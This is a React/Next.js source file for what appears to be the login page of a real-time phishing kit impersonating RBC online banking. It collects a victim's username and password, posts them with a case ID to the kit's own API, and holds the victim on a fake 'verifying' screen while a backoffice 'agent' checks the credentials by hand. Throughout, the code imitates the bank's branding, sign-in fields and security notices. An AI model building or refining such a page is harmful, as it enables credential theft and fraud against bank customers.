'use client';

/**
 * Credentials Stage Page
 *
 * Customer enters username and password
 * Minimal client-side validation - accept any format
 * Agent verifies credentials manually in backoffice
 */

import { useCallback, useEffect, useState } from 'react';
import { useParams } from 'next/navigation';
import { useSessionStore } from '@shared';
import { WaitingState } from '@/components/verification/WaitingState';
import { SplitLayout } from '@/components/layout/SplitLayout';
import { RBCInput, RBCButton, RBCCheckbox, RBCFooter, ServiceNotices } from '@/components/ui/RBCComponents';
import { RBCWaitingState, VERIFICATION_STEPS } from '@/components/ui/RBCWaitingState';
import { HelpIcon } from '@/components/ui/icons';
import { AlertCircle } from 'lucide-react';

export default function CredentialsPage() {
  const params = useParams();
  const sessionUuid = params.session_uuid as string;

  const { stage, status, loading, error, caseId } = useSessionStore();
  const { agentMessage } = useSessionStore();

  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [fieldError, setFieldError] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isHelpOpen, setIsHelpOpen] = useState(false);

  /**
   * Reset form when agent rejects submission
   */
  useEffect(() => {
    if (status === 'rejected' || status === 'error') {
      // Clear form fields and show error
      setUsername('');
      setPassword('');
      setFieldError(agentMessage || 'Your submission was rejected. Please try again.');
      setIsSubmitting(false); // Reset loading state
    }
  }, [status, agentMessage]);

  /**
   * Handle form submission
   */
  const handleSubmit = useCallback(
    async (e: React.FormEvent) => {
      e.preventDefault();
      setFieldError('');

      // Validate case ID is available
      if (!caseId) {
        setFieldError('Session information missing. Please refresh and try again.');
        return;
      }

      // Minimal validation - just check required fields
      if (!username.trim()) {
        setFieldError('Please enter your username');
        return;
      }

      if (!password) {
        setFieldError('Please enter your password');
        return;
      }

      setIsSubmitting(true);

      try {
        const response = await fetch('/api/submit-credentials', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            case_id: caseId,
            username: username.trim(),
            password, // No trimming for password
          }),
        });

        if (!response.ok) {
          console.error('Submission error');
          // Generic error message
          setFieldError('Unable to process your credentials. Please try again.');
          return;
        }

        // Success - show waiting state
        useSessionStore.setState({
          status: 'waiting',
          agentMessage: 'Verifying your credentials...',
          formData: {},
        });
        // Don't set isSubmitting to false - keep waiting state until agent responds
      } catch (error) {
        console.error('Submission error:', error);
        setFieldError('Submission failed. Please try again.');
        setIsSubmitting(false);
      }
    },
    [username, password, sessionUuid, caseId]
  );

  const saveClientLabel = (
    <div className="relative flex items-center">
      <span>Save client card or username</span>
      <button
        type="button"
        className="ml-2 inline-flex items-center justify-center"
        onClick={(e) => {
          e.preventDefault();
          e.stopPropagation();
          setIsHelpOpen(!isHelpOpen);
        }}
      >
        <HelpIcon className="w-4 h-4 text-[#006ac3]" />
      </button>

      {isHelpOpen && (
        <div
          className="absolute bottom-full left-0 mb-2 p-4 bg-white border border-[#eeeeee] shadow-[0_2px_8px_rgba(0,0,0,0.1)] rounded w-[300px] z-10 text-left cursor-default"
          onClick={(e) => {
            e.preventDefault();
            e.stopPropagation();
          }}
        >
          <div className="flex items-center gap-2 mb-3">
            <HelpIcon className="w-4 h-4 text-[#006ac3] shrink-0" />
            <h4 className="font-medium text-[0.95rem] text-[#252525] m-0">Save client card or username</h4>
          </div>
          <p className="text-[0.9rem] font-light text-[#252525] mb-3 leading-snug">
            Select this checkbox if you'd like us to remember your Client Card number or Username.
          </p>
          <p className="text-[0.9rem] font-light text-[#252525] m-0 leading-snug">
            For your security, we don't recommend using this feature on shared or public computers.
          </p>
        </div>
      )}
    </div>
  );

  return (
    <SplitLayout>
      <div className="w-full flex flex-col flex-1">
        {isSubmitting ? (
          <RBCWaitingState
            message="Verifying your credentials..."
            steps={VERIFICATION_STEPS.credentials}
          />
        ) : (
          <form onSubmit={handleSubmit} className="w-full mb-5 shrink-0" noValidate>
            <RBCInput
              id="username"
              name="username"
              type="text"
              label="Client Card or Username"
              value={username}
              onChange={(e) => {
                setUsername(e.target.value);
                if (fieldError) setFieldError('');
              }}
              disabled={isSubmitting || loading}
              autoComplete="username"
              required
            />

            <RBCInput
              id="password"
              name="password"
              type="password"
              label="Password"
              value={password}
              onChange={(e) => {
                setPassword(e.target.value);
                if (fieldError) setFieldError('');
              }}
              disabled={isSubmitting || loading}
              autoComplete="current-password"
              required
            />

            <RBCCheckbox
              id="save-card"
              label={saveClientLabel}
            />

            {/* Field-level error */}
            {fieldError && (
              <div className="flex items-center gap-2 text-sm text-[#ef4444] mb-4">
                <AlertCircle className="h-4 w-4" />
                <span>{fieldError}</span>
              </div>
            )}

            {/* API-level error */}
            {error && !fieldError && (
              <div className="flex items-start gap-3 p-3 bg-[#ef4444]/10 rounded-md border border-[#ef4444]/20 mb-4">
                <AlertCircle className="h-4 w-4 text-[#ef4444] mt-0.5 flex-shrink-0" />
                <p className="text-sm text-[#ef4444]">{error}</p>
              </div>
            )}

            <RBCButton type="submit" disabled={!username.trim() || !password || isSubmitting || loading}>
              {isSubmitting ? 'Processing...' : 'Sign In'}
            </RBCButton>

            <div className="flex flex-col gap-3 mt-5 pt-5 border-t border-[#eeeeee]">
              <a href="#" className="text-[#006ac3] no-underline text-[0.95rem] font-normal transition-colors hover:text-[#005a9f] hover:underline">
                Recover Your Username or Password
              </a>
              <a href="#" className="text-[#006ac3] no-underline text-[0.95rem] font-normal transition-colors hover:text-[#005a9f] hover:underline">
                Enroll in Online Banking
              </a>
            </div>
          </form>
        )}

        <ServiceNotices />
        <RBCFooter />
      </div>
    </SplitLayout>
  );
}
